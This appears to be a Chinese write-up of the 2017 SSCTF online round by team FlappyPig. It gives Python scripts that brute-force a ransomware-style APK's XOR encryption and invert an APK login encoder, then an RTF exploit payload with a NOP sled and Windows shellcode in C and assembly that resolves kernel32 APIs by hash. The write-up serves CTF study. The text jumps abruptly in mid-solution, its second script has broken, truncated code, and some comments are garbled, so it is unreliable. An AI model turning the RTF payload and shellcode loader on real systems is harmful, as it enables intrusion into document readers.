# 【CTF 攻略】第三届 SSCTF 全国网络安全大赛—线上赛 Writeup
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
作者：[ **FlappyPig**](http://bobao.360.cn/member/contribute?uid=1184812799)
预估稿费：600RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**传送门**
[**第三届 SSCTF 全国网络安全大赛—线上赛圆满结束！**](http://bobao.360.cn/ctf/activity/421.html)
2017年5月6日-7日，在陕西省互联网信息办公室、陕西省通信管理局指导下，由陕西省网络安全信息协会、西安四叶草信息技术有限公司与北京兰云科技有限公司联合主办，17家大型互联网行业的SRC和14家专业媒体以及新华网、新浪网、搜狐网、凤凰网、陕西网等20多家媒体的大力支持下，第三届SSCTF全国网络安全大赛—线上初赛圆满结束。
**逆向分析**
**apk100 加密勒索软件**
题目是一个简单的加密软件，一打开软件首先提示输入pin码，点确定后提示输入解密pin码。
进入查看代码，发现第一步会首先计算APK的签名，并将签名与一个MD5做一些乱七八糟的运算得到一个字符数组k1，这里我们不管他，直接使用jeb2动态调试拿到计算完成后的k1结果。
随后会结合我们输入的pin码与k1做一个两层循环的异或运算得到一个新的k1变量。
最后利用这个新的变量对xlsx文件进行一个加密，加密的原理是xlsx文件的每256个字节与k1的相应量做异或。
第二部的解密代码看了看啥也没有，就是验证了一下签名。
思考了一下由于pin码是六位整数，因此可以直接爆破。爆破过程中可以利用zipfile模块的is_zipfile函数来判断是不是zip文件，利用openpyxl模块来判断是不是合法的xlsx文件，同时为了加快速度，优先判断解密后的字符串开头是否为“PK”。
代码：
    from zipfile import is_zipfile
    from openpyxl import load_workbook
    import StringIO
    def getk(key):
        k = [50, 105, 20, 75, 40, 45, 1, 15, 98, 17, 68, 35, 38, 30, 8, 0, 76, 65, 46, 35, 23, 5, 120, 55, 90, 41, 60, 20,
             30, 117, 50, 87, 20, 57, 108, 27, 78, 61, 80, 8]
        for i in range(100):
            for j in range(100):
                k[(i + 17) * (j + 5) % len(k)] = (k[i * j % len(k)] ^ ord(key[i * j % len(key)]) * 7) % 127
        return k
    enc_str = open('ctf1_encode.xlsx', 'rb').read()
    enc_list = [ord(i) for i in enc_str]
    def run():
        magic = enc_list[0] ^ ord('P')
        for key in xrange(100000, 1000000):
            k = getk(str(key))
            if k[0] == magic:
                l = list(enc_list)
                for j in range(0, len(l), 256):
                    l[j] ^= k[j % len(k)]
                s = StringIO.StringIO(''.join([chr(i) for i in l]))
                if is_zipfile(s):
                    print key
                    try:
                        load_workbook(s)
                        print 'got it', key
                        open('tmp.xlsx', 'wb').write(''.join([chr(i) for i in l]))
                        return
                    except:
                        continue
    run()
    #         key = 112355
最后得出来可以是112355，打开xlsx文件是一个图片标注着flag
**apk200 Login**
本题运行apk界面为一个输入框和确定按钮，用jeb反编译，查看关键代码逻辑
可以看出输入字符串长度为12，输入的字符串传入native函数中处理，然后传到a.a方法中，跟进看一下a.a方法，
可以看出该方法主要将处理过的输入字符串和一个字符串常量“01635e6c5f2378255f27356c11663165”进行aes加密后，进行一些异或运算，最后似的变量v0的md5为“cfcd208495d565ef66e7dff9f98764da”，md5查了一下是0，也就是说v0最后的值是0，分析一下代码可以发现，v0只有相加的操作，同时相加的值是两个aes加密结果的异或，因此不难推断出两个aes加密的结果是相同的。
也就是说native层处理完后的输入正好是“01635e6c5f2378255f27356c11663165”，因此加密的主要关注点在native层函数。
Native层函数逻辑比较简单，主要是把输入的每个字符按不同的位进行拆分，拆分后的结果作为一个数组的索引，再把数组的值拼接起来。具体的看代码吧，加解密都实现了。
    L = "!:#$%&()+-*/`~_[]{}?<>,.@^abcdefghijklmnopqrstuvwxyz012345678"
    L = [ord(i) for i in L]
    def enc(s):
        assert len(s) == 12
        l = [ord(i) for i in s]
        r = []
        for i in range(0, len(l), 3):
            r.append(L[
                         l[i] >> 2
                         ]
                     ^ 0x3f)
            r.append(L[
                         (
                             l[i + 1] >> 4
                         )
                         +
                         (
                             (l[i] > 6
                         )
                         ])
            r.append(L[
                         l[i + 2] & 0x3f
                         ])
        print r
        return ''.join([chr(i) for i in r])
    s = enc('0123456789ab')
    # print s
    print len(s)
    print s.encode('hex')
    def dec(s):
        def index(j):
            return L.index(j)
        l = [ord(i) for i in s]
        r = []
        for i in range(0, len(l), 4):
            r.append(
                (
                    (index(l[i] ^ 0x3f) > 4
                )
            )
            r.append(
                (
                    (index(l[i + 1] ^ 0xf) > 2
                )
            )
            r.append(
                (
                    (index(l[i + 2]) 
代码如下：
    {rtf1{}{shp{*shpinst{sp{sv1;1;41414141414142424242414141414141414141414141414141411245fa7f00000000000000000000000000000000000000009090909090909090}{sn pfragments}}}}}
只要在90909090后面跟shellcode即可，于是编写windows下面的shellcode，步骤如下：
1\. 获取kernel32基址
2\. 获取loadlibrary和Getprocaddress地址，参考：http://www.2cto.com/kf/201012/80340.html
3\. 获取文件读写函数地址，fopen，fread，fclose
4．获取malloc地址和messagebox地址
5．读取文件，调用messagebox显示。
其中c盘创建文件内容为随机字符:12k3nihdpi-1234。
C代码如下：编译时去掉栈保护，即可使用自输出函数数据：
    /*
    void *get_kernel32_base()
    {
    __asm
    {
    push ebp
    xor ecx,ecx
    mov esi,fs:0x30
    mov esi, [esi + 0x0C];
    mov esi, [esi + 0x1C];
    next_module:
    mov ebp, [esi + 0x08];
    mov edi, [esi + 0x20];
    mov esi, [esi];
    cmp [edi + 12*2],cl
    jne next_module
    mov edi,ebp;BaseAddr of Kernel32.dll
    mov eax, edi
    pop ebp
    }
    }
    */
    #include 
    #include 
    void ShellcodeEntry();
    #define KERNEL32_HASH 0x000d4e88
    #define KERNEL32_LOADLIBRARYA_HASH 0x000d5786
    #define KERNEL32_GETPROCADDRESSA_HASH 0x00348bfa
    typedef HMODULE (WINAPI *pLoadLibraryA)(LPCTSTR lpFileName);
    typedef FARPROC (WINAPI *pGetProcAddressA)(HMODULE hModule, LPCTSTR lpProcName);
    void  ShellCodeStart(void)
    {
    ShellcodeEntry();
    }
    void ResolvAddr(pLoadLibraryA *pfLoadLibraryA,pGetProcAddressA *pfGetProcAddressA)
    {
    pLoadLibraryA fLoadLibraryA;
    pGetProcAddressA fGetProcAddressA;
    //获?取¨?API函¡¥数ºy地Ì?址¡¤代ä¨²码?出?自Á?The Shellcoders Handbook一°?书º¨¦
    //支¡ì持?win 2k/NT/xp/7其?它¨¹没?测a试º?
    __asm
    {
    push KERNEL32_LOADLIBRARYA_HASH
    push KERNEL32_HASH
    call ResolvFuncAddr
    mov fLoadLibraryA, eax
    push KERNEL32_GETPROCADDRESSA_HASH
    push KERNEL32_HASH
    call ResolvFuncAddr
    mov fGetProcAddressA, eax
    jmp totheend
    ResolvFuncAddr:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    push edi
    push ecx
    push fs:[0x30]
    pop eax
    mov eax, [eax+0x0c]
    mov ecx, [eax+0x0c]
    next_module:
    mov edx, [ecx]
    mov eax, [ecx+0x30]
    push 0x02
    mov edi, [ebp+0x08]
    push edi
    push eax
    call hashit
    test eax, eax
    jz foundmodule
    mov ecx, edx
    jmp next_module
    foundmodule:
    mov eax, [ecx+0x18]
    push eax
    mov ebx, [eax+0x3c]
    add eax, ebx
    mov ebx, [eax+0x78]